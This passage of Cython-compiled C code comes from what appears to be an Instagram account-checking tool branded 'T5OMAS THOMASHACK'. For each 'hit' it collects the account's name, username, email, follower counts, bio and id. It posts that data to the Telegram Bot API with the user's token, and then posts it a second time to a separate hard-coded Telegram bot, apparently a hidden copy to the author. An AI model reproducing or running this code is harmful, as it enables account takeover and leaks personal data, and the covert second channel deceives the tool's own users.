            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_11) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_11);
            __Pyx_GIVEREF(__pyx_t_11);
            PyTuple_SET_ITEM(__pyx_t_10, 13, __pyx_t_11);
            __pyx_t_11 = 0;
            __Pyx_INCREF(__pyx_kp_u_yellow_green_T5OMAS_THOMASHACK);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 94;
            __Pyx_GIVEREF(__pyx_kp_u_yellow_green_T5OMAS_THOMASHACK);
            PyTuple_SET_ITEM(__pyx_t_10, 14, __pyx_kp_u_yellow_green_T5OMAS_THOMASHACK);
            __pyx_t_11 = __Pyx_PyUnicode_Join(__pyx_t_10, 15, __pyx_t_24, __pyx_t_7); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 606, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_XDECREF_SET(__pyx_v_infoprint, ((PyObject*)__pyx_t_11));
            __pyx_t_11 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_console); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 619, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_rule); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 619, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_fj); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 619, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_10, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 619, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_9);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = __Pyx_PyUnicode_Concat(__pyx_kp_u_InstagramHit, __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 619, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            __pyx_t_9 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_9)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_9);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
              }
            }
            __pyx_t_11 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_10);
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 619, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

            
            __Pyx_INCREF(__pyx_v_Panel);
            __pyx_t_10 = __pyx_v_Panel; __pyx_t_9 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
              __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
              if (likely(__pyx_t_9)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                __Pyx_INCREF(__pyx_t_9);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_10, function);
              }
            }
            __pyx_t_12 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_9, __pyx_v_infoprint) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_v_infoprint);
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 620, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_INCREF(__pyx_v_print);
            __pyx_t_10 = __pyx_v_print; __pyx_t_9 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_10))) {
              __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_10);
              if (likely(__pyx_t_9)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_10);
                __Pyx_INCREF(__pyx_t_9);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_10, function);
              }
            }
            __pyx_t_11 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_10, __pyx_t_9, __pyx_t_12) : __Pyx_PyObject_CallOneArg(__pyx_t_10, __pyx_t_12);
            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 620, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_console); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 621, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_n_s_rule); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 621, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            __pyx_t_10 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_10)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_10);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
              }
            }
            __pyx_t_11 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_10, __pyx_kp_u_Telegram_T5OMAS) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_kp_u_Telegram_T5OMAS);
            __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
            if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 621, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

            
            __pyx_t_11 = PyTuple_New(21); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 622, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_24 = 0;
            __pyx_t_7 = 127;
            __Pyx_INCREF(__pyx_kp_u__14);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 49;
            __Pyx_GIVEREF(__pyx_kp_u__14);
            PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_kp_u__14);
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_fj); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 622, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 622, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
            __Pyx_GIVEREF(__pyx_t_10);
            PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_t_10);
            __pyx_t_10 = 0;
            __Pyx_INCREF(__pyx_kp_u__15);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 10;
            __Pyx_GIVEREF(__pyx_kp_u__15);
            PyTuple_SET_ITEM(__pyx_t_11, 2, __pyx_kp_u__15);
            __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_name, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 622, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
            __Pyx_GIVEREF(__pyx_t_10);
            PyTuple_SET_ITEM(__pyx_t_11, 3, __pyx_t_10);
            __pyx_t_10 = 0;
            __Pyx_INCREF(__pyx_kp_u__16);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 18;
            __Pyx_GIVEREF(__pyx_kp_u__16);
            PyTuple_SET_ITEM(__pyx_t_11, 4, __pyx_kp_u__16);
            __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_user, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 622, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
            __Pyx_GIVEREF(__pyx_t_10);
            PyTuple_SET_ITEM(__pyx_t_11, 5, __pyx_t_10);
            __pyx_t_10 = 0;
            __Pyx_INCREF(__pyx_kp_u__17);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 11;
            __Pyx_GIVEREF(__pyx_kp_u__17);
            PyTuple_SET_ITEM(__pyx_t_11, 6, __pyx_kp_u__17);
            __Pyx_INCREF(__pyx_v_email);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_email) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_email) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_v_email);
            __Pyx_GIVEREF(__pyx_v_email);
            PyTuple_SET_ITEM(__pyx_t_11, 7, __pyx_v_email);
            __Pyx_INCREF(__pyx_kp_u__18);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 13;
            __Pyx_GIVEREF(__pyx_kp_u__18);
            PyTuple_SET_ITEM(__pyx_t_11, 8, __pyx_kp_u__18);
            __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_fol, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 622, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
            __Pyx_GIVEREF(__pyx_t_10);
            PyTuple_SET_ITEM(__pyx_t_11, 9, __pyx_t_10);
            __pyx_t_10 = 0;
            __Pyx_INCREF(__pyx_kp_u__19);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 11;
            __Pyx_GIVEREF(__pyx_kp_u__19);
            PyTuple_SET_ITEM(__pyx_t_11, 10, __pyx_kp_u__19);
            __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_fols, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 622, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
            __Pyx_GIVEREF(__pyx_t_10);
            PyTuple_SET_ITEM(__pyx_t_11, 11, __pyx_t_10);
            __pyx_t_10 = 0;
            __Pyx_INCREF(__pyx_kp_u__20);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 10;
            __Pyx_GIVEREF(__pyx_kp_u__20);
            PyTuple_SET_ITEM(__pyx_t_11, 12, __pyx_kp_u__20);
            __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_datet, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 622, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
            __Pyx_GIVEREF(__pyx_t_10);
            PyTuple_SET_ITEM(__pyx_t_11, 13, __pyx_t_10);
            __pyx_t_10 = 0;
            __Pyx_INCREF(__pyx_kp_u__21);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 9;
            __Pyx_GIVEREF(__pyx_kp_u__21);
            PyTuple_SET_ITEM(__pyx_t_11, 14, __pyx_kp_u__21);
            __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_rest, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 622, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
            __Pyx_GIVEREF(__pyx_t_10);
            PyTuple_SET_ITEM(__pyx_t_11, 15, __pyx_t_10);
            __pyx_t_10 = 0;
            __Pyx_INCREF(__pyx_kp_u__22);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 9;
            __Pyx_GIVEREF(__pyx_kp_u__22);
            PyTuple_SET_ITEM(__pyx_t_11, 16, __pyx_kp_u__22);
            __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_bio, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 622, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
            __Pyx_GIVEREF(__pyx_t_10);
            PyTuple_SET_ITEM(__pyx_t_11, 17, __pyx_t_10);
            __pyx_t_10 = 0;
            __Pyx_INCREF(__pyx_kp_u__23);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 8;
            __Pyx_GIVEREF(__pyx_kp_u__23);
            PyTuple_SET_ITEM(__pyx_t_11, 18, __pyx_kp_u__23);
            __pyx_t_10 = __Pyx_PyObject_FormatSimple(__pyx_v_id, __pyx_empty_unicode); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 622, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_10) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_10);
            __Pyx_GIVEREF(__pyx_t_10);
            PyTuple_SET_ITEM(__pyx_t_11, 19, __pyx_t_10);
            __pyx_t_10 = 0;
            __Pyx_INCREF(__pyx_kp_u_T5OMAS_THOMASHACK);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 77;
            __Pyx_GIVEREF(__pyx_kp_u_T5OMAS_THOMASHACK);
            PyTuple_SET_ITEM(__pyx_t_11, 20, __pyx_kp_u_T5OMAS_THOMASHACK);
            __pyx_t_10 = __Pyx_PyUnicode_Join(__pyx_t_11, 21, __pyx_t_24, __pyx_t_7); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 622, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_XDECREF_SET(__pyx_v_infosand, ((PyObject*)__pyx_t_10));
            __pyx_t_10 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_requests); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 637, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_post); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 637, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

            
            __pyx_t_11 = PyTuple_New(6); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 638, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_24 = 0;
            __pyx_t_7 = 127;
            __Pyx_INCREF(__pyx_kp_u_https_api_telegram_org_bot);
            __pyx_t_24 += 28;
            __Pyx_GIVEREF(__pyx_kp_u_https_api_telegram_org_bot);
            PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_kp_u_https_api_telegram_org_bot);
            __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_token); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 638, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_9);
            __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 638, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
            __Pyx_GIVEREF(__pyx_t_4);
            PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_t_4);
            __pyx_t_4 = 0;
            __Pyx_INCREF(__pyx_kp_u_sendMessage_chat_id);
            __pyx_t_24 += 21;
            __Pyx_GIVEREF(__pyx_kp_u_sendMessage_chat_id);
            PyTuple_SET_ITEM(__pyx_t_11, 2, __pyx_kp_u_sendMessage_chat_id);
            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_Id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 638, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 638, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_9);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
            __Pyx_GIVEREF(__pyx_t_9);
            PyTuple_SET_ITEM(__pyx_t_11, 3, __pyx_t_9);
            __pyx_t_9 = 0;
            __Pyx_INCREF(__pyx_kp_u_text_2);
            __pyx_t_24 += 6;
            __Pyx_GIVEREF(__pyx_kp_u_text_2);
            PyTuple_SET_ITEM(__pyx_t_11, 4, __pyx_kp_u_text_2);
            __Pyx_INCREF(__pyx_v_infosand);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_infosand) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_infosand) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_v_infosand);
            __Pyx_GIVEREF(__pyx_v_infosand);
            PyTuple_SET_ITEM(__pyx_t_11, 5, __pyx_v_infosand);
            __pyx_t_9 = __Pyx_PyUnicode_Join(__pyx_t_11, 6, __pyx_t_24, __pyx_t_7); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 638, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_9);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
            __pyx_t_11 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_12))) {
              __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_12);
              if (likely(__pyx_t_11)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
                __Pyx_INCREF(__pyx_t_11);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_12, function);
              }
            }
            __pyx_t_10 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_11, __pyx_t_9) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_t_9);
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 637, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

            
            __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_requests); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 639, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_post); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 639, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_9);
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

            
            __pyx_t_12 = __Pyx_PyUnicode_Concat(__pyx_kp_u_https_api_telegram_org_bot696846, __pyx_v_infosand); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 640, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_11 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
              __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_9);
              if (likely(__pyx_t_11)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
                __Pyx_INCREF(__pyx_t_11);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_9, function);
              }
            }
            __pyx_t_10 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_11, __pyx_t_12) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_12);
            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 639, __pyx_L25_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;

            
          }
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          goto __pyx_L32_try_end;
          __pyx_L25_error:;
          __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;

          
          __pyx_t_14 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
          if (__pyx_t_14) {
            __Pyx_AddTraceback("source.Sajad.chk", __pyx_clineno, __pyx_lineno, __pyx_filename);
            if (__Pyx_GetException(&__pyx_t_10, &__pyx_t_9, &__pyx_t_12) < 0) __PYX_ERR(0, 641, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_10);
            __Pyx_GOTREF(__pyx_t_9);
            __Pyx_GOTREF(__pyx_t_12);

            
            __pyx_t_11 = PyTuple_New(5); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 642, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_24 = 0;
            __pyx_t_7 = 127;
            __Pyx_INCREF(__pyx_kp_u__24);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 49;
            __Pyx_GIVEREF(__pyx_kp_u__24);
            PyTuple_SET_ITEM(__pyx_t_11, 0, __pyx_kp_u__24);
            __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_fj); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 642, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_4);
            __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 642, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
            __Pyx_GIVEREF(__pyx_t_8);
            PyTuple_SET_ITEM(__pyx_t_11, 1, __pyx_t_8);
            __pyx_t_8 = 0;
            __Pyx_INCREF(__pyx_kp_u__25);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 11;
            __Pyx_GIVEREF(__pyx_kp_u__25);
            PyTuple_SET_ITEM(__pyx_t_11, 2, __pyx_kp_u__25);
            __Pyx_INCREF(__pyx_v_email);
            __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_email) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_v_email) : __pyx_t_7;
            __pyx_t_24 += __Pyx_PyUnicode_GET_LENGTH(__pyx_v_email);
            __Pyx_GIVEREF(__pyx_v_email);
            PyTuple_SET_ITEM(__pyx_t_11, 3, __pyx_v_email);
            __Pyx_INCREF(__pyx_kp_u_T5OMAS_THOMASHACK_2);
            __pyx_t_7 = (1114111 > __pyx_t_7) ? 1114111 : __pyx_t_7;
            __pyx_t_24 += 53;
            __Pyx_GIVEREF(__pyx_kp_u_T5OMAS_THOMASHACK_2);
            PyTuple_SET_ITEM(__pyx_t_11, 4, __pyx_kp_u_T5OMAS_THOMASHACK_2);
            __pyx_t_8 = __Pyx_PyUnicode_Join(__pyx_t_11, 5, __pyx_t_24, __pyx_t_7); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 642, __pyx_L27_except_error)
            __Pyx_GOTREF(__pyx_t_8);
            __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
